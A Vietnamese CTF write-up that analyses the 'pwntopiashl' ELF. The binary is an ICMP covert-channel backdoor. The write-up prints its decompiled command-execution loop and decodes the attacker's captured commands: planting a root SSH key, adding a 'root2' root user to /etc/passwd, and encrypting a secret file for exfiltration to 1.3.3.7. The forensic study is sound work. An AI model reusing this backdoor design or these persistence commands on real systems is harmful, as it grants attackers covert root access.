# Mô tả

N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some weird ICMP traffic during the attack, you can find attached a capture file.

Bài cho ta một file [ELF](https://ctf.nops.re/files/651bfcd887c3e78b25a3694b260bd9a2/pwntopiashl?token=eyJ1c2VyX2lkIjoxMDg4LCJ0ZWFtX2lkIjo2ODEsImZpbGVfaWQiOjZ9.aD2DuA.0GEGsircHoTsRwjOcnww9RQSM7Q) và 1 file [pcap](https://ctf.nops.re/files/0853067b01bb3eb1522143e7af928dfa/capture.pcap?token=eyJ1c2VyX2lkIjoxMDg4LCJ0ZWFtX2lkIjo2ODEsImZpbGVfaWQiOjd9.aD2DuA.F8btaNbR2Pj7i0v7vATc3tuw0Hk)

# Phân tích

Kiểm tra file ELF trước, cho vào IDA trong main có gọi hàm  `icmp_packet_listener()` đây là hàm chính mà ta cần phân tích

```c
void __noreturn icmp_packet_listener()
{
  size_t v0; // rbx
  size_t v1; // rbx
  size_t v2; // rbx
  int v3; // eax
  sockaddr addr; // [rsp+0h] [rbp-C810h] BYREF
  _BYTE buf[2]; // [rsp+10h] [rbp-C800h] BYREF
  __int16 v6; // [rsp+12h] [rbp-C7FEh]
  char v7[8]; // [rsp+18h] [rbp-C7F8h] BYREF
  __int64 v8; // [rsp+20h] [rbp-C7F0h] BYREF
  __int16 v9; // [rsp+38h] [rbp-C7D8h]
  __int16 v10; // [rsp+3Ah] [rbp-C7D6h]
  char v11; // [rsp+3Ch] [rbp-C7D4h]
  char v12; // [rsp+3Dh] [rbp-C7D3h]
  __int16 v13; // [rsp+3Eh] [rbp-C7D2h]
  char dest[25536]; // [rsp+40h] [rbp-C7D0h] BYREF
  char s[20]; // [rsp+6400h] [rbp-6410h] BYREF
  char v16; // [rsp+6414h] [rbp-63FCh] BYREF
  int v17; // [rsp+C7C0h] [rbp-50h]
  int v18; // [rsp+C7C4h] [rbp-4Ch]
  FILE *stream; // [rsp+C7C8h] [rbp-48h]
  int v20; // [rsp+C7D0h] [rbp-40h]
  int v21; // [rsp+C7D4h] [rbp-3Ch]
  char *v22; // [rsp+C7D8h] [rbp-38h]
  char *v23; // [rsp+C7E0h] [rbp-30h]
  int fd; // [rsp+C7ECh] [rbp-24h]
  int i; // [rsp+C7F0h] [rbp-20h]
  int j; // [rsp+C7F4h] [rbp-1Ch]
  int v27; // [rsp+C7F8h] [rbp-18h]
  unsigned int v28; // [rsp+C7FCh] [rbp-14h]

  fd = socket(2, 3, 1);
  if ( fd < 0 )
    exit(1);
  while ( 1 )
  {
    do
      memset(s, 0, 0x63C0u);
    while ( recv(fd, s, 0x63BFu, 0) <= 0 );
    v23 = s;
    v22 = &v16;
    v21 = 28;
    if ( v16 == 12 && v22[1] == 35 )
    {
      v9 = *((_WORD *)v22 + 1);
      LOBYTE(v10) = rand();
      HIBYTE(v10) = rand();
      v11 = v9 ^ HIBYTE(v9);
      v12 = v10 ^ HIBYTE(v10);
      v13 = v9 ^ v10;
      memset(buf, 0, 0x20u);
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      buf[0] = 0;
      v6 = v10;
      sleep(1u);
      sendto(fd, buf, v20 + 8LL, 0, &addr, 0x10u);
    }
    if ( *v22 == 19 && v22[1] == 42 )
    {
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      memset(dest, 0, sizeof(dest));
      memcpy(dest, &s[v21], (unsigned int)(25535 - v21));
      for ( i = 25536; ; --i )
      {
        v0 = i;
        if ( v0 < strlen(dest) || dest[i - 1] )
          break;
      }
      for ( j = 0; j < i; ++j )
        dest[j] ^= *((_BYTE *)&v9 + (j & 7));
      puts(dest);
      fflush(_bss_start);
      stream = popen(dest, "r");
      if ( stream )
      {
        memset(dest, 0, sizeof(dest));
        memset(s, 0, 0x63C0u);
        while ( fgets(s, 25536, stream) )
        {
          v1 = strlen(dest);
          if ( v1 + strlen(s) > 0x63BE )
            break;
          strcat(dest, s);
        }
        pclose(stream);
        i = strlen(dest);
        for ( j = 0; j < i; ++j )
          dest[j] ^= *((_BYTE *)&v9 + (j & 7));
        for ( i = 25536; ; --i )
        {
          v2 = i;
          if ( v2 < strlen(dest) || dest[i - 1] )
            break;
        }
        v27 = 0;
        v28 = i;
        v18 = ((unsigned __int64)i >> 4) + 1;
        for ( j = 0; j < v18; ++j )
        {
          memset(buf, 0, 0x20u);
          buf[0] = 8;
          v3 = v28;
          if ( v28 > 0x10 )
            v3 = 16;
          v17 = v3;
          sprintf(v7, "%04d%04d", j + 1, v18);
          memcpy(&v8, &dest[v27], v17);
          v27 += v17;
          v28 -= v17;
          sleep(1u);
          sendto(fd, buf, v17 + 16LL, 0, &addr, 0x10u);
        }
      }
    }
  }
}
```

Hàm `icmp_packet_listener` là một vòng lặp vô hạn lắng nghe và xử lý các packet ICMP nhận được qua socket thô (`socket(2, 3, 1)` - AF_INET, SOCK_RAW, IPPROTO_ICMP)

Tóm tắt chức năng chính:

- Tạo socket để nhận ICMP
- Nhận dữ liệu ICMP vào bộ đệm.
- Nếu gói nhận được có hai byte đầu là `12` và `35` (type 12 code 35), hàm tạo và gửi một phản hồi ICMP dựa trên dữ liệu trong gói. Tạo khoá xor, sau đó gửi một phần của khoá xor đó qua ICMP type 0 code 0
- Nếu hai byte đầu của gói là `19` và `42`, hàm:
  - Giải mã phần payload trong gói ICMP bằng phép XOR với một khóa được tạo từ trước
  - In câu lệnh shell được giải mã ra 
  - Thực thi câu lệnh shell này (`popen`), đọc kết quả
  - Mã hóa lại kết quả bằng XOR và gửi trả lại theo nhiều packet ICMP chia nhỏ, mỗi packet chứa một phần dữ liệu đã mã hóa

## Xor key được tính như nào ?

Như này

```c
v9 = *((_WORD *)v22 + 1);
LOBYTE(v10) = rand();
HIBYTE(v10) = rand();
v11 = v9 ^ HIBYTE(v9);
v12 = v10 ^ HIBYTE(v10);
v13 = v9 ^ v10;
```

Trong file pcap có 4 lần ICMP type 12 được gửi => có 4 xor key (Thực ra là có 3 thôi bởi vì lần thứ 4 gửi xong không làm gì nữa). **Xor key này sẽ được sử dụng cho đến khi hacker gửi một packet ICMP type 12 code 35 khác**

**Nội dung payload type 12 mà hacker gửi sẽ là 2 byte icmp.checksum**

Ví dụ:

```
00000000000000000000000008004500001c0001000040017cde01030307070303010c23da0a00000000

icmp.type = 0c (12)
icmp.code = 23 (35)
=> icmp.checksum = da 0a
- Đây là v9 của cta trong packet 1
```

Ta cần v9 và v10, v9 nằm ở packet ICMP type 12 và v10 nằm ở ICMP type 0, hacker sẽ gửi packet type 9 trước sau đó phần mềm tạo cái v10 bằng hàm `rand()` sau đó reply type 0. XOR key hoàn chỉnh sẽ bao gồm 8byte, nếu ít hoặc nhiều hơn thì dữ liệu khi giải mã sẽ sai

```
Byte 0-1: v9 (2 bytes)
Byte 2-3: v10 (2 bytes) 
Byte 4:   v11 (1 byte)
Byte 5:   v12 (1 byte)
Byte 6-7: v13 (2 bytes)
```

```
v9 = ICMP type 12 code 35
v10 = ICMP echo reply
v11 = v9 ^ HIBYTE(v9)
v12 = v10 ^ HIBYTE(v10)
v13 = v9 ^ v10
```

Ví dụ ở đầu: Packet 1 + 2

```
v9 = 0x0ada
v10 = 0xe0de
v11 = v9 ^ HIBYTE(v9) = 0x0ada ^ 0x0a = 0xd0
v12 = v10 ^ HIBYTE(v10) = 0xe0de ^ 0xe0 = 0x3e  
v13 = v9 ^ v10 = 0x0ada ^ 0xe0de = 0xea04

=> Xor key: da 0a de e0 d0 3e 04 ea
da0adee0d03e04ea
```

Xor key này sẽ được sử dụng cho đến khi hacker gửi một packet ICMP type 12 code 35 khác

Tạo 1 script decode các payload ICMP type 19 code 42 (Hacker sẽ gửi các payload này cho phần mềm, decode, thực hiện lệnh trên máy nạn nhân)

**Nội dung payload type 19 mà hacker gửi sẽ nằm sau 2 byte icmp.checksum + với các byte 000000**

Ví dụ: Packet 3

```
00000000000000000000000008004500001e0001000040017cdc0103030707030301132a396700000000b36e

icmp.checksum = 39 67
=> b3 6e
```

```py
#!/usr/bin/env python3
"""
ICMP Type 19 Code 42 Payload Decoder
Decodes XOR-encrypted payloads using provided key
"""
# Nhờ claude viết hehe
import sys
import binascii

def decode_payload(payload_hex, xor_key_hex):
    """
    Decode XOR-encrypted payload using 8-byte repeating key
    
    Args:
        payload_hex: Hex string of encrypted payload
        xor_key_hex: Hex string of 8-byte XOR key
    
    Returns:
        Decoded payload as string
    """
    # Convert hex strings to bytes
    try:
        payload = bytes.fromhex(payload_hex.replace(' ', '').replace('\n', ''))
        xor_key = bytes.fromhex(xor_key_hex.replace(' ', '').replace('\n', ''))
    except ValueError as e:
        raise ValueError(f"Invalid hex input: {e}")
    
    if len(xor_key) != 8:
        raise ValueError(f"XOR key must be 8 bytes, got {len(xor_key)} bytes")
    
    # XOR decode with repeating 8-byte key
    decoded = bytearray()
    for i, byte in enumerate(payload):
        key_byte = xor_key[i % 8]  # Use modulo for repeating key
        decoded.append(byte ^ key_byte)
    
    # Convert to string, handling null bytes and non-printable characters
    try:
        # Remove trailing null bytes
        decoded = decoded.rstrip(b'\x00')
        result = decoded.decode('utf-8', errors='replace')
        return result
    except:
        # If decoding fails, return as hex
        return decoded.hex()

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 icmp_decoder.py <payload_hex> <xor_key_hex>")
        print("Example: python3 icmp_decoder.py 'deadbeef...' 'da0adee0d03e04ea'")
        sys.exit(1)
    
    payload_hex = sys.argv[1]
    xor_key_hex = sys.argv[2]
    
    try:
        decoded = decode_payload(payload_hex, xor_key_hex)
        print("Decoded payload:")
        print(decoded)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def interactive_decode():
    """Interactive mode for decoding multiple payloads"""
    print("ICMP Type 19 Payload Decoder - Interactive Mode")
    print("=" * 50)
    
    # Get XOR key once
    while True:
        xor_key_hex = input("Enter 8-byte XOR key (hex): ").strip()
        try:
            xor_key = bytes.fromhex(xor_key_hex.replace(' ', ''))
            if len(xor_key) == 8:
                break
            else:
                print(f"Key must be 8 bytes, got {len(xor_key)} bytes")
        except ValueError:
            print("Invalid hex format")
    
    print(f"Using XOR key: {xor_key.hex()}")
    print("\nEnter payloads to decode (or 'quit' to exit):")
    
    while True:
        payload_hex = input("\nPayload (hex): ").strip()
        
        if payload_hex.lower() in ['quit', 'exit', 'q']:
            break
            
        if not payload_hex:
            continue
            
        try:
            decoded = decode_payload(payload_hex, xor_key_hex)
            print(f"Decoded: {decoded}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        interactive_decode()
    else:
        main()
```

### 3 payload đầu

```
ICMP Type 19 Payload Decoder - Interactive Mode
==================================================
Enter 8-byte XOR key (hex): da0adee0d03e04ea
Using XOR key: da0adee0d03e04ea

Enter payloads to decode (or 'quit' to exit):

Payload (hex): b36e
Decoded: id

Payload (hex): b761ba89a21e2b98b565aacffe4d7782fa2cf8c0b55d6c85fa2dad93b8137699bb2a9fa1917f46d99470bfa3e14767d89f4b9fa1917a45bb9b489fa1917c63bb9972f5aae85372dde3789f91bf566b82bc6eb09a9a7a46b9ec7db88ebc0f56beea498b859967759bb55da8d7866a63839947b38d9709739dee60b8b7a46630a38268e8ab9e0f71a5eb3d9490b64f6b8eea68ac93e36f4c8db37dae97b879668eaf788ead975c5e9db740bfb8b47d668cec3384b4aa5835b38364e798a60b57928f78b2a7b7072bbf9b79ecb1b276549eea78bd92a60b5dddb83ee9a985516087e242e7b0e66d6dbcbe6eb6a7994e56bcb35eb1a29a643cd9b66f9981847362a2e85de78dbf6962a7ae699085b77069989369edafb258488bea258ad0e37f63d8b47db4aebb5146a5ad688ccf830b73998b53aba5a55840a2944cea85915b53a193218b93827c35d3a37895afbd4c7798b6648fd8e30f4eb9b3538fd5867d4089b962a7a8870c429b9f61b8cf9c753087984fecb9ff4b3c8fae4ba99ab7573d8e8c6891d4b45652dbb94deaaab46b41df8225b388a0566f9e8047ee9aa90d2b83ec4bad94877565869e738b8e9b6d56819c63f58991533788b03fac87e65b5e99b85d869abf574bbb927c978a924a6e818e43bf8eb54b62879647af8ae54c4abfb445b9a2990f63869b47aed5a27a619dab42ebb7b75f3ddab66eba94927a4adce3328bacbf7755b8f15e8a85ff0f6298a34dbda2b3754ab2b3589c86b50c629bab41ee89e9494bb3e83aa695ff0a70ba804bb78cbf1156bba2419cb8954f318da937f9c0ee1e2b98b565aacffe4d7782f563babfa24d65c4aa7fbc
Decoded: mkdir /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx+J8mv79rAqohohfdnzJDBS6wfnl1RT0CUeIYqqoWv7VTgiCMmmG7ww4jfWtX4IXb6KN1uO17Jpfqod0brs3QHgiwpwhGbdurPMGbZwmJaXdCbf69ZTzf1YYn9xv5SxUrlGg9/UAs2QbHPt0rcrv5Y7b47IUodm8H9P6SiVddhGIpRViToBJZ83leGaTMfH2W9moWfMtcNegNmrIc3ObfLa0/T03Ag2nwjNkoBOwbR/S5wsQYuEufDHNF4eAeWKI+UsRB19yrKOmrsrlnQ831JSiYQ5VCDcchyHW2FqEkf/LK4mBE2Y/u8etAwzgi9dVbO4dhV1cG4JdUE5X/mhphktZM0zy3/i6AstWKalDyUnKSRkFi+iAm3bj5rg6eZsbWXzoiOQHvIjBtjkTIaneufmLMqj5rNUnOgBI1glAMp5rDewqH5Wga90lddtBDN698ULoIQR+TTe/1fryGcBcKNXiRBfe2fqqK0i9wOY20xu/4tPZAilo/RQxKBXEq5gs=' > /root/.ssh/id_rsa.pub

Payload (hex): b96baac0ff4c6b85ae25f093a3562b83be55ac93b110749fb8
Decoded: cat /root/.ssh/id_rsa.pub
```

**Kết quả**: Attacker có thể SSH vào server với quyền root bất cứ lúc nào mà không cần password

Sau đó chương trình này lưu lại kết quả, mã hoá với xor key, gửi nó đi qua ICMP type 8 (Echo request). CTF-wise vì cái này không có gì liên quan đến flag nên t nhảy luôn lên cái thứ 3 xem có gì luôn

### 3 payload tiếp theo

Tại packet 45+46 ta có xor key mới

```
v9 = 0xff3c
v10 = 0xe8b4
v11 = v9 ^ HIBYTE(v9) = 0xff3c ^ 0xff = 0xc3
v12 = v10 ^ HIBYTE(v10) = 0xe8b4 ^ 0xe8 = 0x5c
v13 = v9 ^ v10 = 0xff3c ^ 0xe8b4 = 0x1788

=> Xor key: 3c ff b4 e8 c3 5c 88 17
3cffb4e8c35c8817
```

Decode xem

```
ICMP Type 19 Payload Decoder - Interactive Mode
==================================================
Enter 8-byte XOR key (hex): 3cffb4e8c35c8817
Using XOR key: 3cffb4e8c35c8817

Enter payloads to decode (or 'quit' to exit):

Payload (hex): 538fd186b02fe4374c9ec79bb438a8674b91c0d8b36dbc
Decoded: openssl passwd pwnt0p14

Payload (hex): 599cdc87e37bfa78538b86d2e76dac730caef1abb119dc33588afbbbb973d25a7b99ff89900cef6e449ed3a1ad6cb22706cf8e9aac33fc2d138ddb87b766a77555919b8aa22fe0301cc18ac8ec39fc74138fd59bb02bec
Decoded: echo 'root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash' >> /etc/passwd

Payload (hex): 489edd84e371e6370ddf9b8db73fa7675d8cc79fa7
Decoded: tail -n 1 /etc/passwd
```

**Kêt quả:** Tạo backdoor user `root2` với mk `pwnt0p14` với quyền root

### 3 payload cuối

Bắt đầu tại packet 59 + 60 ta có tạo được xor key

```
v9 = 0x0aea
v10 = 0x44dc
v11 = v9 ^ HIBYTE(v9) = 0x0aea ^ 0x0a = 0xe0
v12 = v10 ^ HIBYTE(v10) = 0x44dc ^ 0x44 = 0x98
v13 = v9 ^ v10 = 0x0aea ^ 0x44dc = 0x4e36

=> Xor key: ea 0a dc 44 e0 98 36 4e
ea0adc44e098364e
```

Decode xem đã chạy lệnh gì

```
ICMP Type 19 Payload Decoder - Interactive Mode
==================================================
Enter 8-byte XOR key (hex): ea0adc44e098364e
Using XOR key: ea0adc44e098364e

Enter payloads to decode (or 'quit' to exit):

Payload (hex): 9a7db8
Decoded: pwd

Payload (hex): 8679fc698cf9
Decoded: ls -la

Payload (hex): 896ba864ceeb532d986fa8649cb8593e8f64af378cb85320892af12585eb1b7cdf3cf12782fb16638b2af13781f4426ec77abe2f84fe046ec77abd3793b8462f9979e63385c74639846fb81b8ef7463d
Decoded: cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops
```

Sau đó, chương trình lưu lại kết quả các lệnh đã chạy, mã hoá với xor key, gửi nó đi qua ICMP type 8 (Echo request) đến IP của hacker (1.3.3.7). Kết quả khi gửi đi sẽ được chia thành nhiều fragments nhỏ khác nhau (Trong mục data.data của các packet ICMP type 8), cần  có tất cả các fragment thì mới decode được kết quả. Chúng được đánh dấu theo dạng

```
XXXXYYYY....
```

Trong đó `XXXX` là số thứ tự

`YYYY` là tổng có bao nhiêu fragment

Và phần còn lại sẽ là kết quả được mã hoá

**Ví dụ:**

```
3030303130303035bf389a3784df6025b23bf737a4fc0329

30303031: trong ascii là 0001 -> Fragment số 1
30303035: trong ascii là 0005 -> Tổng cộng có 5 fragment
bf389a3784df6025b23bf737a4fc0329: Kết quả bị mã hoá
```

Vậy ta cần tạo thêm một script nữa để decode payload của packet ICMP type 8

```python
#!/usr/bin/env python3

import sys

class ICMPPayloadDecoder:
    def __init__(self, xor_key_hex):
        self.xor_key = bytes.fromhex(xor_key_hex.replace(' ', '').replace('\n', ''))
        if len(self.xor_key) != 8:
            raise ValueError("XOR key must be exactly 8 bytes")
        self.fragments = {}

    def decode_fragment_payload(self, payload_hex):
        payload = bytes.fromhex(payload_hex.strip())

        if len(payload) < 8:
            raise ValueError("Payload too short - need at least 8 bytes for fragment header")

        try:
            seq_info = payload[:8].decode('ascii')
            current_frag = int(seq_info[:4])
            total_frags = int(seq_info[4:8])
        except Exception as e:
            raise ValueError(f"Failed to parse fragment header: {e}")

        encrypted_data = payload[8:]  # có thể rỗng hoặc chỉ 1 byte
        self.fragments[current_frag] = encrypted_data

        print(f"Fragment {current_frag}/{total_frags} added ({len(encrypted_data)} bytes)")

        if len(self.fragments) == total_frags:
            return self.assemble_and_decrypt(total_frags)
        return None

    def assemble_and_decrypt(self, total_frags):
        assembled = b''
        for i in range(1, total_frags + 1):
            if i not in self.fragments:
                raise ValueError(f"Missing fragment {i}")
            assembled += self.fragments[i]

        decrypted = self.xor_decrypt(assembled).rstrip(b'\x00')
        try:
            return decrypted.decode('utf-8', errors='replace')
        except:
            return decrypted.hex()

    def xor_decrypt(self, data):
        return bytes([b ^ self.xor_key[i % 8] for i, b in enumerate(data)])

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 icmp_type8_payload_decoder.py <xor_key_hex>")
        sys.exit(1)

    xor_key_hex = sys.argv[1]
    decoder = ICMPPayloadDecoder(xor_key_hex)

    print("ICMP Type 8 Payload Decoder - Interactive Mode")
    print("=" * 50)
    print(f"Using XOR key: {xor_key_hex}")
    print("\nEnter payloads to decode (or 'quit' to exit):\n")

    while True:
        line = input("Payload (hex): ").strip()
        if line.lower() in ['quit', 'exit', 'q']:
            break
        if not line:
            continue
        try:
            result = decoder.decode_fragment_payload(line)
            if result:
                print("\n" + "=" * 40)
                print("Decoded result:")
                print(result)
                print("=" * 40)
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

Xor key thì vẫn được dùng chung cho payload type 8 thôi. Ở cái payload type 19 cuối cùng (Packet 77) hacker gửi lệnh

```bash
cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops
```

Là mã hóa file `.secret` thành b64 bằng AES-256-CBC với mật khẩu `we_pwned_nops`. Vậy kết quả khi gửi đi sẽ là một đoạn mã b64 - khả năng cao là flag

Vào wireshark lấy 5 cái payload type 8 đằng sau (Packet 78->82) đưa vào script để decode 

```
$ python type8_v2.py ea0adc44e098364e
ICMP Type 8 Payload Decoder - Interactive Mode
==================================================
Using XOR key: ea0adc44e098364e

Enter payloads to decode (or 'quit' to exit):

Payload (hex): 3030303130303035bf389a3784df6025b23bf737a4fc0329
Fragment 1/5 added (16 bytes)
Payload (hex): 3030303230303035de409f3cb4f07a0ca765f30d93db7d27
Fragment 2/5 added (16 bytes)
Payload (hex): 30303033303030359d72ae2dbad9792a896c9073b9a0552b
Fragment 3/5 added (16 bytes)
Payload (hex): 3030303430303035804d9a088fab5c3eab63a53199e00121
Fragment 4/5 added (16 bytes)
Payload (hex): 3030303530303035e0
Fragment 5/5 added (1 bytes)

========================================
Decoded result:
U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o
```

Đúng như vậy, đảo ngược lại lệnh mã hoá là ra flag

```bash
$ echo "U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o" | openssl enc -d -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops
N0PS{v3Ry_s734lThY_1cMP_sh3Ll}
```

`N0PS{v3Ry_s734lThY_1cMP_sh3Ll}`
